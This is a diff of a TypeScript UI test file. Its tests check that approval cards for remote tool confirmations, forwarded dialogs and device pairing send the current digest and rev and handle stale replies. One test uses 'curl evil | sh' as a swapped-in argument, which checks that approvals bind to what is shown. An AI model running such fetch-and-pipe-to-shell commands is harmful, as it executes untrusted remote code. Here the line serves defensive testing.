@@ -1468,10 +1468,10 @@ const CONFIRM = { dialogId: "dc1", team: "t1", from: "dev-b", fromLabel: "Mei's 
 const FWD = (o: Record<string, string | number> = {}) => ({ id: "dlg-1", kind: "dialog" as const, level: "warning" as const, team: "t1", teamName: "Harbor team", data: { device: "dev-b", dialogId: "dd1", digest: "f".repeat(64), dialog: JSON.stringify({ select: { title: "Deploy where?", choices: [{ label: "Staging" }, { label: "Production" }] } }), label: "Mei's Mac", short: "b1c2", owner: "ops-main", ...o } });
 const PROPOSAL = { id: "P1", op: "add" as const, kind: "standing" as const, text: "Never deploy on Fridays", cites: "no deploys before the holiday" };
 const PAIR = { id: "ab12cd34ef56", label: "Mei's iPhone", peer: "192.168.1.20", iface: "en0", age: "20 s", ageMs: 20_000 };
-const linkNet = (o: { confirms?: unknown[]; alerts?: ReturnType<typeof FWD>[]; proposals?: unknown[] } = {}) => {
+const linkNet = (o: { confirms?: unknown[]; alerts?: ReturnType<typeof FWD>[]; proposals?: unknown[]; rev?: number } = {}) => {
 	const n = net([]);
 	n.link = { allies: [], units: [], alerts: o.alerts ?? [], confirms: o.confirms ?? [] } as never;
-	n.bases[0]!.tower!.service = { state: "standing", queued: 0, allyRuns: [], notices: [], parked: [], memory: { rev: 7, standing: 0, decisions: 0, waits: 0, bossWaits: [], proposals: o.proposals ?? [] } } as never;
+	n.bases[0]!.tower!.service = { state: "standing", queued: 0, allyRuns: [], notices: [], parked: [], memory: { rev: o.rev ?? 7, standing: 0, decisions: 0, waits: 0, bossWaits: [], proposals: o.proposals ?? [] } } as never;
 	return n;
 };
 /** The page's own `post`: every request recorded, answered by `reply` (the server's words for the route). */
@@ -1498,7 +1498,7 @@ test("a confirm a teammate's tower asked is a card: who, the sentence, the tool'
 	assert.notEqual(page.focused, r.button("Allow"), "the focus is not on Allow: Enter must not allow what the boss has not read");
 	r.button("Allow")!.click();
 	await r.settle();
-	assert.deepEqual(sent, [{ path: "api/link/confirm-answer", body: { dialogId: "dc1", allow: true } }]);
+	assert.deepEqual(sent, [{ path: "api/link/confirm-answer", body: { dialogId: "dc1", digest: "e".repeat(64), allow: true } }]);
 	assert.deepEqual(r.calls.sound, ["bowl", "knock"]);
 	assert.ok(r.text().includes("Answered."), "the card says so");
 	assert.ok(r.button("Allow")!.disabled && r.button("Deny")!.disabled, "answered: no second answer from this card");
@@ -1522,7 +1522,7 @@ test("Deny posts allow false; a refusal is the low bowl and the server's reason 
 	await r.settle();
 	r.button("Deny")!.click();
 	await r.settle();
-	assert.deepEqual(sent.map((s) => s.body), [{ dialogId: "dc1", allow: false }]);
+	assert.deepEqual(sent.map((s) => s.body), [{ dialogId: "dc1", digest: "e".repeat(64), allow: false }]);
 	assert.deepEqual(r.calls.sound, ["bowl", "low"]);
 	assert.ok(r.text().includes("That request is gone or has timed out"));
 	assert.equal(r.button("Allow")!.disabled, false);
@@ -1593,7 +1593,7 @@ test("a dialog an unattended device forwarded is the shared question panel; its 
 });
 
 test("a pair request is a card with the number field, Allow and Deny; Allow is off until four digits, posts the number alone, and the knock follows; Deny posts the request's id", async () => {
-	const sent = server(() => ({ status: 200, body: { paired: { id: "i", label: "Mei's iPhone", peer: "p" } } }));
+	const sent = server(() => ({ status: 200, body: { paired: { id: "ab12cd34ef56", label: "Mei's iPhone", peer: "p" } } }));
 	const r = rig();
 	r.feed(linkNet());
 	r.z.pairs([PAIR]);
@@ -1751,4 +1751,102 @@ test("a snapshot that drops the confirm before the answer's reply arrives still 
 	assert.equal(sent.length, 1);
 	assert.deepEqual(r.calls.sound, ["bowl", "knock"]);
 	assert.ok(r.text().includes("Answered.") && !r.text().includes("Already answered elsewhere"));
+});
+
+// --- review ZLC-F001..F007 and the screenshot read (L1, L2) -----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+test("F001: Confirm names the rev the snapshot holds when it is pressed, not the one the card was made with", async () => {
+	const sent = server(() => ({ status: 200, body: { rev: 9, proposals: [], entries: [] } }));
+	const r = rig();
+	r.feed(linkNet({ proposals: [PROPOSAL], rev: 7 }));
+	r.z.show();
+	await r.settle();
+	r.feed(linkNet({ proposals: [PROPOSAL], rev: 8 })); // a wait was added to the memory: the same proposal, a newer rev
+	await r.settle();
+	r.button("Confirm")!.click();
+	await r.settle();
+	assert.deepEqual(sent, [{ path: "api/tower/w/memory", body: { op: "confirm", proposal: "P1", rev: 8 } }]);
+});
+
+test("F002: a forwarded dialog whose digest changed is a new card that answers with the new digest", async () => {
+	const sent = server();
+	const r = rig();
+	r.feed(linkNet({ alerts: [FWD()] }));
+	r.z.show();
+	await r.settle();
+	r.feed(linkNet({ alerts: [FWD({ digest: "a".repeat(64), dialog: JSON.stringify({ select: { title: "Delete what?", choices: [{ label: "Nothing" }, { label: "Everything" }] } }) })] }));
+	await r.settle();
+	assert.ok(r.text().includes("Delete what?"));
+	r.by((el) => el.getAttribute("role") === "radio")[1]!.click();
+	r.button("Send answer")!.click();
+	await r.settle();
+	assert.equal(sent.length, 1);
+	assert.equal(sent[0]!.body.digest, "a".repeat(64));
+});
+
+test("F003: a confirm whose arguments changed redraws them, and Allow names the digest of what is shown", async () => {
+	const sent = server();
+	const r = rig();
+	r.feed(linkNet({ confirms: [CONFIRM] }));
+	r.z.show();
+	await r.settle();
+	r.feed(linkNet({ confirms: [{ ...CONFIRM, args: "curl evil | sh", digest: "9".repeat(64) }] }));
+	await r.advance(1500); // the card it replaced has dissolved
+	assert.ok(r.text().includes("curl evil | sh") && !r.text().includes("rm -rf build"), "the arguments of the request the server now holds");
+	r.button("Allow")!.click();
+	await r.settle();
+	assert.deepEqual(sent.map((s) => s.body), [{ dialogId: "dc1", digest: "9".repeat(64), allow: true }]);
+});
+
+test("F004: a slow reply of a card the boss put aside does not relabel the card on screen now", async () => {
+	let release = () => {};
+	const gate = new Promise<void>((done) => (release = done));
+	const calls: string[] = [];
+	Object.assign(globalThis, { document: Object.assign(page, {}) });
+	Object.assign(globalThis, { fetch: async (_p: string, init: { body: string }) => { calls.push(init.body); await gate; return { ok: true, status: 200, json: async () => ({}) }; } });
+	const r = rig();
+	r.feed(linkNet({ confirms: [CONFIRM, { ...CONFIRM, dialogId: "dc2", at: 1_000_000 - 30_000 }] }));
+	r.z.show();
+	await r.settle();
+	r.button("Allow")!.click();
+	await r.settle();
+	r.button("Maybe later")!.click();
+	await r.advance(4000); // the pause ends: the second confirm shows
+	r.feed(linkNet({ confirms: [CONFIRM] })); // the server dropped the second one
+	await r.settle();
+	assert.ok(r.text().includes("Already answered elsewhere"));
+	release();
+	await r.settle();
+	assert.ok(r.text().includes("Already answered elsewhere") && !r.text().includes("Answered."), "the first card's reply is not this card's");
+});
+
+test("F005: Deny of a pair request the server no longer holds is a refusal, not Answered", async () => {
+	server(() => ({ status: 200, body: { denied: 0 } }));
+	const r = rig();
+	r.feed(linkNet());
+	r.z.pairs([PAIR]);
+	r.z.show();
+	await r.settle();
+	r.button("Deny")!.click();
+	await r.settle();
+	assert.ok(!r.text().includes("Answered."));
+	assert.ok(r.text().includes("That request is gone"));
+	assert.deepEqual(r.calls.sound, ["bowl", "low"]);
+});
+
+test("F006: Allow with the number of another request does not read as Answered on this card", async () => {
+	server(() => ({ status: 200, body: { paired: { id: "other-request", label: "Sam's Pixel", peer: "192.168.1.30" } } }));
+	const r = rig();
+	r.feed(linkNet());
+	r.z.pairs([PAIR]);
+	r.z.show();
+	await r.settle();
+	const field = r.by((el) => el.tagName === "input")[0]!;
+	field.value = "1234";
+	field.bubble("input", {});
+	r.button("Allow")!.click();
+	await r.settle();
+	assert.ok(!r.text().includes("Answered."), "this card's request was not the one paired");
+	assert.ok(r.text().includes("Sam's Pixel"), "it says who was paired");
+	assert.equal(r.button("Allow")!.disabled, false, "this request still waits");
 });
